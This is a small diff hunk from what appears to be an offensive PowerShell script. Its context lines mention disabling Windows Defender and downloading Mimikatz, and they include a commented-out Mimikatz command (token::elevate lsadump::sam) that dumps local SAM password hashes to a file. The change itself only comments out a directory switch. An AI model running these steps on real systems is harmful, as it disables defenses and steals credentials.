@@ -16,7 +16,7 @@ Write-Output "[+] Disabled Windows Defender"
 #Write-Output "[+] Mimikatz downloaded and extracted"
 
 #Write-Output "[+] Pulling down hashes"
-cd .\mimikatz\x64
+#cd .\mimikatz\x64
 
 #.\mimikatz.exe token::elevate lsadump::sam exit >> hashes.txt
 #mv hashes.txt ..\..\..\hashes.txt
